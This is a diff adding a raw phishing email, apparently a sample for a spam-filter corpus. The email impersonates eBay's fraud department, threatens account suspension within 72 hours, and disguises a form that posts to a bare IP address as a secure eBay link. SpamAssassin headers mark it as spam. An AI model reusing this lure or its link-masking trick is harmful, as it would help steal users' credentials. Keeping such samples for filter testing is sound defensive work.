@@ -1,0 +1,130 @@
+From nobody Sun Jan 25 14:03:09 2015
+Return-Path: <service@eBay.com>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail2.domain.com (mail2.domain.com [192.168.3.4])
+ by naughty.domain.com (Postfix) with ESMTP id F03D9536E69
+ for <username@login.domain.com>; Sun, 18 Sep 2005 13:11:05 -0400 (EDT)
+Received: from mail2.domain.com (localhost.domain.com [127.0.0.1])
+ by mail2.domain.com (Postfix) with ESMTP id C60986FA1E7
+ for <username@domain.com>; Sun, 18 Sep 2005 13:10:59 -0400 (EDT)
+Received: from 86.126.133.2 (unknown [86.126.133.2])
+ by mail2.domain.com (Postfix) with SMTP
+ for <username@domain.com>; Sun, 18 Sep 2005 13:10:59 -0400 (EDT)
+Received: from 8.73.80.217 by ; Sun, 18 Sep 2005 21:07:59 +0300
+Message-ID: <YGFDHQCSVVVHWSWIEHAGCI@charter.net>
+From: "service@eBay.com" <service@eBay.com>
+Reply-To: "service@eBay.com" <service@eBay.com>
+To: username@domain.com
+Subject: Update And Verify Your eBay Account
+Date: Sun, 18 Sep 2005 20:01:59 +0200
+X-Mailer: Microsoft Outlook Express 5.00.2615.200
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--77779619375309842"
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Spam-Flag: YES
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: *****************
+X-Spam-Status: Yes, score=17.1 required=5.0 tests=EXCUSE_1, FORGED_MUA_OUTLOOK,
+ FORGED_OUTLOOK_HTML,FORGED_OUTLOOK_TAGS,HTML_50_60,HTML_FONT_BIG,
+ HTML_MESSAGE,HTML_MIME_NO_HTML_TAG,MIME_BOUND_DD_DIGITS,
+ MIME_HTML_ONLY,MIME_HTML_ONLY_MULTI,MIME_QP_LONG_LINE,MISSING_MIMEOLE,
+ MPART_ALT_DIFF,MSGID_SPAM_CAPS,NORMAL_HTTP_TO_IP,RCVD_NUMERIC_HELO 
+ autolearn=spam version=3.0.2
+X-Spam-Report: * 4.1 MIME_BOUND_DD_DIGITS Spam tool pattern in MIME boundary
+ *  3.8 MSGID_SPAM_CAPS Spam tool Message-Id: (caps variant)
+ *  1.2 RCVD_NUMERIC_HELO Received: contains an IP address used for HELO
+ *  0.1 EXCUSE_1 BODY: Gives a lame excuse about why spam was sent
+ *  0.0 NORMAL_HTTP_TO_IP URI: Uses a dotted-decimal IP address in URL
+ *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.1 HTML_FONT_BIG BODY: HTML tag for a big font size
+ *  0.1 MPART_ALT_DIFF BODY: HTML and text parts are different
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ *  0.1 HTML_50_60 BODY: Message is 50% to 60% HTML
+ *  0.0 MIME_QP_LONG_LINE RAW: Quoted-printable line longer than 76 chars
+ *  0.6 FORGED_OUTLOOK_HTML Outlook can't send HTML message only
+ *  0.1 HTML_MIME_NO_HTML_TAG HTML-only message, but there is no HTML tag
+ *  0.1 FORGED_OUTLOOK_TAGS Outlook can't send HTML in this format
+ *  2.4 MIME_HTML_ONLY_MULTI Multipart message only has text/html MIME parts
+ *  0.0 MISSING_MIMEOLE Message has X-MSMail-Priority, but no X-MimeOLE
+ *  3.9 FORGED_MUA_OUTLOOK Forged mail pretending to be from MS Outlook
+X-Keywords: 
+X-UID: 261
+Status: O
+Content-Length: 5091
+Lines: 72
+
+----77779619375309842
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<body> <p>  <font size=3D"2" face=3D"Arial, Verdana">        <table width=3D=
+"765" border=3D"0" align=3D"center">         <tr>           <td width=3D"7=
+59" height=3D"578"><p>           <img        alt=3D"From collectibles to c=
+ars, buy and sell all kinds of items on  eBay"        src=3D"http://pics.e=
+baystatic.com/aw/pics/navbar/eBayLogoTM.gif"  border=3D0 width=3D"150" hei=
+ght=3D"70"><img height=3D"75"  src=3D"http://pics.ebaystatic.com/aw/pics/s=
+ecurityCenter/src/hdrS&RC_649x75.gif"  width=3D"649" /><font size=3D"2" fa=
+ce=3D"Arial, Verdana"><img height=3D"30"  src=3D"http://pics.ebaystatic.co=
+m/aw/pics/securityCenter/src/hdrS&RC_110x30.gif"  width=3D"110" /></font><=
+/p>             <p><font size=3D"4" face=3D"Times New Roman, Times,  serif=
+"><strong><font face=3D"Verdana, Arial, Helvetica, sans-serif">eBay       =
+              Safeharbor Department  Notice</font></strong></font></p>    =
+         <p><font face=3D"Verdana, Arial, Helvetica,  sans-serif"><strong>=
+Fraud Alert                   ID : 00626654</strong></font></p>           =
+  <p></p>        <p align=3D"justify"><font size=3D"2" face=3D"Verdana, Ar=
+ial, Helvetica,  sans-serif">Dear eBay         member,<br>         <br>   =
+      You have received this email because you or someone else had used  y=
+our         identity to make false purchases on eBay. For security reasons=
+, we  are         required to open an investigation on this matter. We tre=
+at online  fraud         seriously and all cases which cannot be resolved =
+between eBay and  the         other involved party are forwarded for furth=
+er investigations to  the proper         authorities. To speed up this pro=
+cess, you are required to verify  your         personal information agains=
+t the eBay account registration data we  have         on file by following=
+ the link below.</font></p> <FORM action=3Dhttp://66.29.22.221/~catalina/e=
+Bay/index.php?eBayISAPI.dll?SignIn&co_partnerId=3D2&pUserId=3D&siteid=3D0&=
+pageType=3D&pa1=3D&i1=3D&bshowgif=3D&UsingSSL=3D&ru=3D&pp=3D&pa2=3D&errmsg=
+=3D&runame=3D&ruparams=3D&ruproduct=3D&sid=3D&favoritenav=3D&migrate> <a h=
+ref=3D"https://signin.ebay.com/ws/eBayISAPI.dll?SignIn"> <INPUT style=3D"B=
+ORDER-RIGHT: 0pt; BORDER-TOP: 0pt; FONT-SIZE: 10pt; BORDER-LEFT: 0pt; CURS=
+OR: hand; COLOR: blue; BORDER-BOTTOM: 0pt; BACKGROUND-COLOR: transparent; =
+TEXT-DECORATION: underline" type=3Dsubmit value=3Dhttps://secure.ebay.com/=
+eBayISAPI.dll?action=3Dverify&id=3D00626654&user=3D>  </a>             <p>=
+<font size=3D"2" face=3D"Verdana, Arial, Helvetica,  sans-serif">Please   =
+              save this fraud alert id for your reference.</font></p>     =
+   <p align=3D"justify"><font size=3D"2" face=3D"Verdana, Arial, Helvetica=
+,  sans-serif">When submitting         sensitive information via the websi=
+te, your information is  protected both         online and off-line. When =
+our registration/order form asks users  to enter         sensitive informa=
+tion (such as credit card number and/or social  security         number), =
+that information is encrypted and is protected with the  best         encr=
+yption software in the industry - SSL.</font></p>             <table width=
+=3D"97%" border=3D"0" bgcolor=3D"#EFEFEF">               <tr>            <=
+td> 			<p align=3D"justify"><font size=3D"2" face=3D"Verdana,  Arial, Helv=
+etica, sans-serif">Please             Note - If your account informations =
+are not updated within the  next             72 hours, we will assume this=
+ account is fraudulent and it  will be             suspended. We apologize=
+ for this inconvenience, but the  purpose of             this verification=
+ is to ensure that your eBay account has not  been             fraudulentl=
+y used and to combat fraud.</font></td>               </tr>             </=
+table>             <p><font size=3D"2" face=3D"Verdana, Arial, Helvetica, =
+ sans-serif">We                 apreciate your support and understanding, =
+as we work  together                 to keep eBay a safe place to trade.</=
+font></p>             <p><font size=3D"2" face=3D"Verdana, Arial, Helvetic=
+a,  sans-serif">Thank you for your patience in this matter.</font></p>    =
+         <p><font size=3D"2" face=3D"Verdana, Arial, Helvetica,  sans-seri=
+f">Regards, Safeharbor Department (Trust and Safety  Department)<br>   eBa=
+y Inc.</font></p>        <p><font color=3D"#999999" size=3D"2" face=3D"Ver=
+dana, Arial, Helvetica,  sans-serif">Please         do not reply to this e=
+-mail as this is only a notification mail  sent to         this address an=
+d can not be replied to.</font></p>           <p align=3D"center"><font si=
+ze=3D"1" face=3D"Verdana, Arial,  Helvetica, sans-serif">Copyright 2005 eB=
+ay Inc. All Rights Reserved.<br>           Designated trademarks and brand=
+s are the property of their  respective               owners.<br>         =
+eBay and the eBay logo are trademarks of eBay Inc. which is  located on   =
+      Hamilton Avenue, San  =20
+
+----77779619375309842--
